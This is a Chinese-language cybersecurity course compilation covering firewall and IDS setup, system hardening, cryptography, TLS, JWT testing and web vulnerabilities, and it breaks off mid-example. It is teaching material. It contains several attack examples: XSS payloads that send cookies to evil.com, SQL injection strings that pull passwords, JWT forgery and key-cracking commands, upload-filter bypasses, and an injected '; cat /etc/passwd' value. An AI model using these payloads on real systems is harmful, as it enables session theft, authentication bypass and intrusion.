---
order: 10
title: cybersecurity 模块文档合集
module: 'cybersecurity'
category: 云与基础设施
difficulty: intermediate
description: 本模块全部文档合并生成的完整合集，按学习顺序排列。
author: fanquanpp
updated: '2026-08-13'
related: []
prerequisites: []
---

<!-- ============ 文档分隔线：033-cybersecurity/001-SecurityBasicsDefense.md ============ -->


## 1. 防火墙策略配置

### 1.1 防火墙类型

| 类型         | 工作层次      | 特点                     | 典型产品            |
| :----------- | :------------ | :----------------------- | :------------------ |
| 包过滤       | 网络层        | 基于 IP/端口过滤，速度快 | iptables、ACL       |
| 状态检测     | 网络层/传输层 | 跟踪连接状态，安全性高   | 华为USG、Cisco ASA  |
| 应用层网关   | 应用层        | 深度包检测，可识别协议   | WAF、下一代防火墙   |
| 下一代防火墙 | 全层          | IPS+AV+应用识别一体化    | Palo Alto、Fortinet |

### 1.2 防火墙策略设计原则

```
1. 默认拒绝（Default Deny）— 仅放行必要流量
2. 最小权限（Least Privilege）— 精确到源/目的/端口/协议
3. 纵深防御（Defense in Depth）— 多层策略叠加
4. 策略顺序 — 从精确到宽泛，先匹配先生效
```

### 1.3 iptables 防火墙配置

```bash
# 查看当前规则
iptables -L -n -v --line-numbers

# 设置默认策略
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# 允许回环接口
iptables -A INPUT -i lo -j ACCEPT

# 允许已建立的连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 允许 SSH（限速防暴力破解）
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# 允许 HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 允许 ICMP（限制速率）
iptables -A INPUT -p icmp --icmp-type echo-request \
  -m limit --limit 1/s --limit-burst 3 -j ACCEPT

# 记录被拒绝的流量
iptables -A INPUT -j LOG --log-prefix "IPTables-Dropped: " --log-level 4
iptables -A INPUT -j DROP

# 保存规则
iptables-save > /etc/iptables/rules.v4
```

### 1.4 华为防火墙安全策略配置

```bash
# 创建安全区域
[FW] firewall zone trust
[FW-zone-trust] add interface GigabitEthernet0/0/1
[FW] firewall zone untrust
[FW-zone-untrust] add interface GigabitEthernet0/0/2

# 配置安全策略
[FW] security-policy
[FW-policy-security] rule name Allow-Web
[FW-policy-security-rule-Allow-Web] source-zone trust
[FW-policy-security-rule-Allow-Web] destination-zone untrust
[FW-policy-security-rule-Allow-Web] destination-address 10.1.1.0 24
[FW-policy-security-rule-Allow-Web] service http https
[FW-policy-security-rule-Allow-Web] action permit

# NAT 策略
[FW] nat-policy
[FW-policy-nat] rule name SNAT
[FW-policy-nat-rule-SNAT] source-zone trust
[FW-policy-nat-rule-SNAT] destination-zone untrust
[FW-policy-nat-rule-SNAT] action source-nat easy-ip
```

## 2. 入侵检测系统（IDS）

### 2.1 IDS 与 IPS 对比

| 维度     | IDS（入侵检测）      | IPS（入侵防御）          |
| :------- | :------------------- | :----------------------- |
| 部署方式 | 旁路镜像             | 串联部署                 |
| 动作     | 仅告警               | 告警 + 阻断              |
| 延迟影响 | 无                   | 微量延迟                 |
| 误报影响 | 仅产生噪音告警       | 可能阻断正常业务         |
| 典型产品 | Snort、Suricata(IDS) | Suricata(IPS)、Snort IPS |

### 2.2 Snort 配置示例

```bash
# 安装 Snort
apt install snort -y

# 基本配置 /etc/snort/snort.conf
var HOME_NET 192.168.1.0/24
var EXTERNAL_NET !$HOME_NET

# 规则语法
# action protocol src_ip src_port -> dst_ip dst_port (options;)

# 检测 ICMP 洪水
alert icmp any any -> $HOME_NET any (msg:"ICMP Flood Detected"; \
  threshold:type both, track by_src, count 100, seconds 5; \
  sid:1000001; rev:1;)

# 检测 SQL 注入尝试
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; \
  flow:to_server,established; \
  content:"UNION SELECT"; nocase; \
  sid:1000002; rev:1;)

# 检测可疑 SSH 登录
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force"; \
  threshold:type both, track by_src, count 5, seconds 60; \
  sid:1000003; rev:1;)

# 启动 Snort（IDS 模式）
snort -A console -q -c /etc/snort/snort.conf -i eth0
```

### 2.3 Suricata IPS 模式

```bash
# 安装 Suricata
apt install suricata -y

# IPS 模式配置（NFQ）
suricata -c /etc/suricata/suricata.yaml -q 0

# iptables 将流量重定向到 Suricata
iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
```

## 3. 系统安全加固

### 3.1 Windows 安全加固

```powershell
# 账户策略
net accounts /maxpwage:90 /minpwage:1 /minpwlen:12 /uniquepw:5
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30

# 禁用危险服务
Set-Service -Name "Telnet" -StartupType Disabled -Status Stopped
Set-Service -Name "RemoteRegistry" -StartupType Disabled -Status Stopped

# 防火墙配置
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Enable-NetFirewallRule -DisplayGroup "远程桌面"

# 审计策略
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Object Access" /success:enable /failure:enable
auditpol /set /subcategory:"Privilege Use" /success:enable /failure:enable

# 禁用 SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting 2
Update-MpSignature
```

### 3.2 Linux 安全加固

```bash
# SSH 安全配置 /etc/ssh/sshd_config
Port 2222                          # 修改默认端口
PermitRootLogin no                 # 禁止 root 登录
PasswordAuthentication no          # 禁用密码认证
PubkeyAuthentication yes           # 启用密钥认证
MaxAuthTries 3                     # 最大尝试次数
LoginGraceTime 30                  # 登录超时
AllowUsers admin@192.168.1.0/24    # 限制用户和来源

# 文件权限加固
chmod 700 /root
chmod 600 /etc/shadow
chmod 644 /etc/passwd
chattr +i /etc/passwd /etc/shadow  # 不可变属性

# 内核安全参数 /etc/sysctl.conf
net.ipv4.tcp_syncookies = 1        # SYN Flood 防护
net.ipv4.conf.all.rp_filter = 1    # 反向路径过滤
net.ipv4.icmp_echo_ignore_broadcasts = 1  # 忽略广播 ICMP
kernel.exec-shield = 1             # 执行保护
fs.suid_dumpable = 0               # 禁止 SUID 核心转储

# 生效
sysctl -p

# 禁用不必要的 SUID
find / -perm -4000 -type f 2>/dev/null
chmod u-s /bin/ping                # 按需移除 SUID
```

## 4. 对称加密算法

### 4.1 算法对比

| 算法     | 密钥长度   | 分组模式   | 速度 | 安全性   | 应用场景       |
| :------- | :--------- | :--------- | :--- | :------- | :------------- |
| DES      | 56 位      | 64 位分组  | 快   | 低(已破) | 遗留系统       |
| 3DES     | 112/168 位 | 64 位分组  | 慢   | 中       | 兼容旧系统     |
| AES-128  | 128 位     | 128 位分组 | 很快 | 高       | 通用加密       |
| AES-256  | 256 位     | 128 位分组 | 快   | 极高     | 军事/金融      |
| ChaCha20 | 256 位     | 流密码     | 极快 | 极高     | 移动端/TLS 1.3 |

### 4.2 AES 加密示例

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

# 生成随机密钥和 IV
key = os.urandom(32)   # AES-256
iv = os.urandom(16)

# 加密
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = b"Hello, FANDEX Security!"
ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

# 解密
decipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(decipher.decrypt(ciphertext), AES.block_size)
print(decrypted.decode())  # Hello, FANDEX Security!
```

### 4.3 分组模式

| 模式 | 特点              | 并行加密 | 随机访问 | 推荐   |
| :--- | :---------------- | :------- | :------- | :----- |
| ECB  | 相同明文→相同密文 | 是       | 是       | 不推荐 |
| CBC  | 链式，需要 IV     | 否       | 否       | 可用   |
| CTR  | 计数器模式，流式  | 是       | 是       | 推荐   |
| GCM  | 认证加密(AEAD)    | 是       | 是       | 最推荐 |

## 5. 非对称加密算法

### 5.1 算法对比

| 算法 | 数学基础         | 密钥长度(等效安全) | 速度 | 用途               |
| :--- | :--------------- | :----------------- | :--- | :----------------- |
| RSA  | 大整数分解       | 3072 位            | 慢   | 加密/签名/密钥交换 |
| ECC  | 椭圆曲线离散对数 | 256 位             | 快   | 移动端/IoT/签名    |
| DSA  | 离散对数         | 3072 位            | 慢   | 仅签名             |

### 5.2 RSA 示例

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

# 生成 RSA 密钥对
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# RSA 加密（小数据/密钥交换）
recipient_key = RSA.import_key(public_key)
cipher_rsa = PKCS1_OAEP.new(recipient_key)
ciphertext = cipher_rsa.encrypt(b"Secret Key: AES-256-Key-Here")

# RSA 解密
private_key_obj = RSA.import_key(private_key)
decipher_rsa = PKCS1_OAEP.new(private_key_obj)
plaintext = decipher_rsa.decrypt(ciphertext)

# RSA 签名
message = b"Important document content"
h = SHA256.new(message)
signature = pkcs1_15.new(private_key_obj).sign(h)

# RSA 验签
try:
    pkcs1_15.new(RSA.import_key(public_key)).verify(h, signature)
    print("签名验证通过")
except (ValueError, TypeError):
    print("签名验证失败")
```

## 6. 哈希算法

### 6.1 算法对比

| 算法    | 输出长度 | 速度     | 安全性   | 用途              |
| :------ | :------- | :------- | :------- | :---------------- |
| MD5     | 128 位   | 极快     | 低(碰撞) | 文件校验(非安全)  |
| SHA-1   | 160 位   | 快       | 低(碰撞) | 遗留系统          |
| SHA-256 | 256 位   | 快       | 高       | 通用哈希/数字签名 |
| SHA-384 | 384 位   | 中       | 很高     | 高安全场景        |
| SHA-512 | 512 位   | 中       | 极高     | 高安全场景        |
| bcrypt  | 184 位   | 慢(可调) | 高       | 密码存储          |
| Argon2  | 可变     | 慢(可调) | 最高     | 密码存储(推荐)    |

### 6.2 密码存储最佳实践

```python
import hashlib
import bcrypt
import argon2

#  不安全：明文存储
password = "P@ssw0rd"

#  不安全：简单哈希
md5_hash = hashlib.md5(password.encode()).hexdigest()

#  不安全：SHA256 无盐
sha256_hash = hashlib.sha256(password.encode()).hexdigest()

#  安全：bcrypt（自动加盐）
salt = bcrypt.gensalt(rounds=12)  # cost factor = 12
hashed = bcrypt.hashpw(password.encode(), salt)
# 验证
bcrypt.checkpw(password.encode(), hashed)  # True

#  最安全：Argon2id（抗 GPU/ASIC）
ph = argon2.PasswordHasher(
    time_cost=3,        # 迭代次数
    memory_cost=65536,  # 内存 64MB
    parallelism=4,      # 并行度
    hash_len=32,
    salt_len=16
)
hash_str = ph.hash(password)
# 验证
ph.verify(hash_str, password)  # True
```

## 7. SSL/TLS 协议

### 7.1 TLS 握手流程（TLS 1.3）

```mermaid
flowchart TD
    T0["客户端                                    服务器"]
    T1["ClientHello"]
    T2["(支持的密码套件、密钥共享)"]
    T3["ServerHello"]
    T4["(选定套件、密钥共享、证书)"]
    T5["Certificate"]
    T6["CertificateVerify"]
    T7["Finished"]
    T8["Finished"]
    T9["安全通信开始"]
    T0 --> T1
    T0 --> T2
    T0 --> T3
    T0 --> T4
    T0 --> T5
    T0 --> T6
    T0 --> T7
    T0 --> T8
    T0 --> T9
```

### 7.2 TLS 版本对比

| 版本    | 安全性 | 主要改进                           | 状态     |
| :------ | :----- | :--------------------------------- | :------- |
| SSL 3.0 | 极低   | -                                  | 已废弃   |
| TLS 1.0 | 低     | SSL 3.0 升级                       | 已废弃   |
| TLS 1.1 | 低     | 安全性增强                         | 已废弃   |
| TLS 1.2 | 高     | AEAD 密码套件、SHA-256             | 当前主流 |
| TLS 1.3 | 极高   | 1-RTT 握手、0-RTT 恢复、移除弱算法 | 推荐     |

### 7.3 Nginx TLS 配置

```nginx
server {
    listen 443 ssl http2;
    server_name www.fandex.local;

    # 证书配置
    ssl_certificate     /etc/nginx/ssl/server.crt;
    ssl_certificate_key /etc/nginx/ssl/server.key;

    # 仅允许 TLS 1.2 和 1.3
    ssl_protocols TLSv1.2 TLSv1.3;

    # 密码套件（优先 ECDHE + AEAD）
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:
                ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:
                ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers on;

    # HSTS（强制 HTTPS）
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # 会话恢复
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
}
```
## JWT 生成与解析

**基本写法:生成 HS256 Token**
`python3 -c "import jwt; print(jwt.encode({'<字段>':'<值>'}, '<密钥>', algorithm='HS256'))"`
```bash
# 生成 HS256 算法 JWT Token
python3 -c "import jwt; print(jwt.encode({'user':'admin','exp':1893456000}, 'secretkey', algorithm='HS256'))"
```

**基本写法:解析 JWT Token**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', algorithms=['HS256']))"`
```bash
# 解析并验证 JWT Token
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', 'secretkey', algorithms=['HS256']))"
```

**基本写法:无验证解析 Token**
`python3 -c "import jwt; print(jwt.decode('<Token>', options={'verify_signature': False}))"`
```bash
# 不验证签名直接解析 Token(仅用于调试)
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', options={'verify_signature': False}))"
```

**基本写法:使用 jq 解析 Header/Payload**
`echo "<Token>" | cut -d. -f2 | base64 -d 2>/dev/null`
```bash
# 手动解码 JWT Payload 部分
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d 2>/dev/null
```

**基本写法:使用 jwt-cli 工具**
`jwt decode <Token>`
```bash
# 使用 jwt-cli 命令行工具解码
jwt decode eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

---

## JWT 算法检测

**基本写法:查看 Token Header 算法**
`echo "<Token>" | cut -d. -f1 | base64 -d 2>/dev/null`
```bash
# 查看 JWT 使用的签名算法
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
```

**基本写法:Python 提取算法**
`python3 -c "import jwt; print(jwt.get_unverified_header('<Token>'))"`
```bash
# 提取 JWT Header 不验证签名
python3 -c "import jwt; print(jwt.get_unverified_header('eyJhbGciOiJIUzI1NiJ9.payload.sig'))"
```

**基本写法:检测 none 算法漏洞**
`python3 -c "import jwt; t=jwt.encode({'user':'admin'}, '', algorithm='none'); print(t)"`
```bash
# 生成 alg=none 的 Token 检测目标是否接受
python3 -c "import jwt; t=jwt.encode({'user':'admin'}, '', algorithm='none'); print(t)"
```

**基本写法:测试 none 算法绕过**
`curl -H "Authorization: Bearer <Token>" <URL>`
```bash
# 使用 none 算法 Token 测试绕过
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://example.com/api
```

---

## JWT 弱密钥检测

**基本写法:使用 jwt_tool 爆破密钥**
`python3 jwt_tool.py <Token> -C -d <字典>`
```bash
# 使用字典爆破 HS256 签名密钥
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.payload.sig -C -d passwords.txt
```

**基本写法:使用 hashcat 爆破**
`hashcat -m 16500 <Token> <字典>`
```bash
# 使用 hashcat 模式 16500 爆破 JWT 密钥
hashcat -m 16500 eyJhbGciOiJIUzI1NiJ9.payload.sig rockyou.txt
```

**基本写法:使用 john 爆破**
`python3 jwt2john.py <Token> > <hash文件>; john <hash文件> --wordlist=<字典>`
```bash
# 使用 John the Ripper 爆破 JWT
python3 jwt2john.py eyJhbGciOiJIUzI1NiJ9.payload.sig > jwt.hash
john jwt.hash --wordlist=passwords.txt
```

**基本写法:验证弱密钥**
`python3 -c "import jwt; print(jwt.decode('<Token>', 'secret', algorithms=['HS256']))"`
```bash
# 测试常见弱密钥 secret/123456 等
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.payload.sig', 'secret', algorithms=['HS256']))"
```

---

## JWT 密钥混淆攻击检测

**基本写法:RS256 公钥提取**
`openssl x509 -pubkey -noout -in <证书> > <公钥文件>`
```bash
# 从证书提取公钥用于算法混淆检测
openssl x509 -pubkey -noout -in cert.pem > public.pem
```

**基本写法:使用 jwt_tool 测试混淆**
`python3 jwt_tool.py <Token> -X k -pk <公钥文件>`
```bash
# 使用公钥作为 HS256 密钥构造混淆 Token
python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9.payload.sig -X k -pk public.pem
```

**基本写法:构造 RS256 转 HS256 攻击**
`python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('public.pem').read(), algorithm='HS256'))"`
```bash
# 使用公钥作为 HMAC 密钥构造 Token
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('public.pem').read(), algorithm='HS256'))"
```

**基本写法:验证目标是否受影响**
`curl -H "Authorization: Bearer <构造Token>" <URL>`
```bash
# 使用混淆 Token 测试目标是否接受
curl -H "Authorization: Bearer <混淆Token>" https://example.com/api
```

---

## JWT 声明校验

**基本写法:校验 exp 过期时间**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', algorithms=['HS256']))"`
```bash
# 默认会校验 exp 字段
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['HS256']))"
```

**基本写法:忽略过期校验检测**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', options={'verify_exp': False}))"`
```bash
# 测试目标是否校验 exp
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['HS256'], options={'verify_exp': False}))"
```

**基本写法:校验签发者 iss**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', issuer='<签发者>', algorithms=['HS256']))"`
```bash
# 校验 JWT 签发者字段
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', issuer='auth.example.com', algorithms=['HS256']))"
```

**基本写法:校验受众 aud**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', audience='<受众>', algorithms=['HS256']))"`
```bash
# 校验 JWT 受众字段
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', audience='api.example.com', algorithms=['HS256']))"
```

---

## JWT 安全生成

**基本写法:生成带过期时间的 Token**
`python3 -c "import jwt, time; print(jwt.encode({'user':'admin','exp':int(time.time())+3600}, 'secret', algorithm='HS256'))"`
```bash
# 生成有效期 1 小时的 Token
python3 -c "import jwt, time; print(jwt.encode({'user':'admin','exp':int(time.time())+3600}, 'secret', algorithm='HS256'))"
```

**基本写法:生成 RS256 Token**
`python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('private.pem').read(), algorithm='RS256'))"`
```bash
# 使用 RSA 私钥生成 Token
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('private.pem').read(), algorithm='RS256'))"
```

**基本写法:生成强随机密钥**
`openssl rand -base64 48`
```bash
# 生成 HS256 使用的强随机密钥
openssl rand -base64 48
```

**基本写法:生成 jti 唯一标识**
`python3 -c "import jwt, uuid; print(jwt.encode({'jti':str(uuid.uuid4())}, 'secret', algorithm='HS256'))"`
```bash
# 生成带唯一标识的 Token 防重放
python3 -c "import jwt, uuid; print(jwt.encode({'jti':str(uuid.uuid4()),'user':'admin'}, 'secret', algorithm='HS256'))"
```

---

## JWT 安全配置(Nginx)

**基本写法:Nginx 校验 Authorization 头**
`if ($http_authorization !~ "^Bearer ") { return 401; }`
```bash
# Nginx 校验 Authorization 头格式
if ($http_authorization !~ "^Bearer ") {
    return 401;
}
```

**基本写法:转发 Token 到后端**
`proxy_set_header Authorization $http_authorization;`
```bash
# 反向代理转发 Authorization 头
proxy_set_header Authorization $http_authorization;
```

**基本写法:限制 Token 长度**
`client_header_buffer_size <大小>; large_client_header_buffers <数量> <大小>;`
```bash
# 限制请求头大小防止超大 Token
client_header_buffer_size 4k;
large_client_header_buffers 4 8k;
```

**基本写法:使用 auth_request 校验**
`auth_request /auth;`
```bash
# 使用子请求校验 JWT
location /api {
    auth_request /auth;
}
location = /auth {
    proxy_pass http://auth_service/verify;
}
```

---

## JWT 审计与监控

**基本写法:检索日志中 JWT 使用**
`grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" <日志>`
```bash
# 从日志中提取所有 JWT Token
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" /var/log/nginx/access.log
```

**基本写法:统计 Token 使用频率**
`grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" <日志> | sort | uniq -c | sort -rn`
```bash
# 统计各 Token 使用频率检测异常
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" /var/log/nginx/access.log | sort | uniq -c | sort -rn | head
```

**基本写法:检测 none 算法攻击**
`grep -i "eyJhbGciOiJub25lIn0\|eyJhbGciOiJub25lI" <日志>`
```bash
# 检测使用 none 算法的攻击 Token
grep -i "eyJhbGciOiJub25lIn0\|eyJhbGciOiJub25lI" /var/log/nginx/access.log
```

**基本写法:监控 Token 异常使用**
`tail -f <日志> | grep -i "bearer\|jwt"`
```bash
# 实时监控 JWT 相关请求
tail -f /var/log/nginx/access.log | grep -i "bearer\|jwt\|eyJ"
```

---

## JWT 安全自检

**基本写法:检查密钥强度**
`echo -n "<密钥>" | wc -c`
```bash
# 检查 JWT 签名密钥长度是否足够(建议 32 字节以上)
echo -n "secretkey" | wc -c
```

**基本写法:验证是否使用强算法**
`echo "<Token>" | cut -d. -f1 | base64 -d 2>/dev/null | grep -i "alg"`
```bash
# 检查 Token 是否使用 HS256/RS256 而非 none
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
```

**基本写法:检查代码是否校验算法**
`grep -rn "algorithms=\[" <项目目录>`
```bash
# 检查代码是否显式指定允许的算法
grep -rn "algorithms=\[" src/
```

**基本写法:批量验证 Token 配置**
`python3 -c "import jwt; h=jwt.get_unverified_header('<Token>'); print(h)"`
```bash
# 批量检查 Token 配置
python3 -c "import jwt; h=jwt.get_unverified_header('eyJ...'); print('算法:', h.get('alg')); print('类型:', h.get('typ'))"
```



<!-- ============ 文档分隔线：033-cybersecurity/002-WebSecurityPenetrationTesting.md ============ -->


## 1. OWASP Top 10

### 1.1 2021 版 OWASP Top 10

| 排名 | 风险                   | 说明                             |
| :--- | :--------------------- | :------------------------------- |
| A01  | 权限控制失效           | 越权访问、IDOR、CORS 配置错误    |
| A02  | 加密机制失效           | 弱密码、明文存储、不安全协议     |
| A03  | 注入                   | SQL/NoSQL/OS/LDAP 注入           |
| A04  | 不安全设计             | 缺乏安全架构、威胁建模不足       |
| A05  | 安全配置错误           | 默认配置、目录遍历、错误信息泄露 |
| A06  | 易受攻击和过时的组件   | 使用已知漏洞的第三方库           |
| A07  | 身份识别和认证失败     | 弱密码策略、会话管理缺陷         |
| A08  | 软件和数据完整性失败   | 不安全的 CI/CD、反序列化漏洞     |
| A09  | 安全日志和监控失效     | 日志不足、告警缺失               |
| A10  | 服务器端请求伪造(SSRF) | 内网探测、云元数据泄露           |

## 2. SQL 注入

### 2.1 注入类型

| 类型     | 特点                     | 检测难度 |
| :------- | :----------------------- | :------- |
| 联合查询 | UNION SELECT 拼接        | 低       |
| 报错注入 | 利用数据库报错信息回显   | 低       |
| 布尔盲注 | 通过真/假响应判断        | 中       |
| 时间盲注 | 通过响应延迟判断         | 高       |
| 堆叠查询 | 多语句执行（;分隔）      | 低       |
| 二次注入 | 数据存储后再次使用时触发 | 高       |

### 2.2 注入示例与防御

```sql
-- 联合查询注入
-- 原始查询: SELECT * FROM users WHERE id = '$id'
-- 注入 payload: ' UNION SELECT 1,username,password FROM users --
SELECT * FROM users WHERE id = '' UNION SELECT 1,username,password FROM users --'

-- 布尔盲注
-- payload: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
-- 逐字符爆破密码

-- 时间盲注
-- payload: ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0) --
```

**防御措施**：

```python
#  不安全：字符串拼接
query = f"SELECT * FROM users WHERE id = '{user_id}'"

#  安全：参数化查询
import sqlite3
conn = sqlite3.connect('app.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

#  安全：ORM 框架
# SQLAlchemy
user = session.query(User).filter(User.id == user_id).first()

#  安全：输入验证
import re
if not re.match(r'^\d+$', user_id):
    raise ValueError("Invalid user ID")
```

## 3. XSS 跨站脚本

### 3.1 XSS 类型

| 类型       | 注入位置       | 持久性 | 危害 |
| :--------- | :------------- | :----- | :--- |
| 反射型 XSS | URL 参数       | 否     | 中   |
| 存储型 XSS | 服务器存储     | 是     | 高   |
| DOM 型 XSS | 客户端 JS 渲染 | 否     | 中   |

### 3.2 XSS 攻击示例

```html
<!-- 反射型 XSS -->
<!-- URL: https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> -->

<!-- 存储型 XSS -->
<!-- 留言板提交: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"> -->

<!-- DOM 型 XSS -->
<!-- 页面 JS: document.getElementById('output').innerHTML = location.hash.slice(1) -->
<!-- URL: https://example.com/page#<img src=x onerror=alert(1)> -->
```

### 3.3 XSS 防御

```python
# 后端输出编码
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = escape(query)  # HTML 实体编码
    return f'<p>搜索结果: {safe_query}</p>'
```

```javascript
// 前端防御
// 1. 使用 textContent 代替 innerHTML
element.textContent = userInput;

// 2. DOMPurify 清洗 HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 3. Content Security Policy
// HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

```python
# Flask CSP 配置
from flask_talisman import Talisman
app = Flask(__name__)
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': "'self'",
    'style-src': "'self' 'unsafe-inline'"
})
```

## 4. CSRF 跨站请求伪造

### 4.1 攻击原理

```
1. 用户登录 bank.com，获取会话 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面包含:
   <img src="https://bank.com/transfer?to=hacker&amount=10000">
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. bank.com 服务器认为是合法操作
```

### 4.2 CSRF 防御

```python
# Flask-WTF CSRF Token
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# 模板中
# <form method="POST">
#   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
#   ...
# </form>
```

```python
# SameSite Cookie 属性
app.config.update(
    SESSION_COOKIE_SECURE=True,     # 仅 HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # JS 不可读
    SESSION_COOKIE_SAMESITE='Lax'   # 限制跨站发送
)
```

```python
# 验证 Origin/Referer 头
from flask import request, abort

@app.before_request
def check_origin():
    if request.method in ('POST', 'PUT', 'DELETE'):
        origin = request.headers.get('Origin', '')
        allowed = ['https://www.fandex.local', 'https://fandex.local']
        if origin not in allowed:
            abort(403)
```

## 5. 文件上传漏洞

### 5.1 常见绕过方式

| 绕过方式       | 方法                           |
| :------------- | :----------------------------- |
| 后缀名绕过     | .php5、.phtml、.php.jpg        |
| MIME 类型绕过  | 修改 Content-Type: image/jpeg  |
| 大小写绕过     | .PhP、.pHp                     |
| 双写绕过       | .pphphp（过滤 php 后剩余 php） |
| %00 截断       | shell.php%00.jpg               |
| .htaccess 上传 | 自定义解析规则                 |

### 5.2 安全上传实现

```python
import os
import uuid
from pathlib import Path
from flask import request, jsonify

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    ext = filename.rsplit('.', 1)[-1].lower()
    return ext in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400

    file = request.files['file']

    # 1. 检查文件扩展名
    if not allowed_file(file.filename):
        return jsonify({'error': 'File type not allowed'}), 400

    # 2. 检查文件大小
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        return jsonify({'error': 'File too large'}), 400

    # 3. 重命名文件（防止路径穿越）
    ext = file.filename.rsplit('.', 1)[-1].lower()
    safe_name = f"{uuid.uuid4().hex}.{ext}"

    # 4. 保存到 Web 根目录外
    upload_dir = '/data/uploads'
    file.save(os.path.join(upload_dir, safe_name))

    return jsonify({'filename': safe_name}), 200
```

## 6. 命令执行漏洞

### 6.1 命令注入

```python
#  不安全：直接拼接用户输入
import os
def ping_host(host):
    os.system(f"ping -c 3 {host}")  # 危险！
    # 攻击: host = "127.0.0.1; cat /etc/passwd"

#  安全：使用 subprocess + 参数列表
import subprocess
def ping_host_safe(host):
    # 输入验证
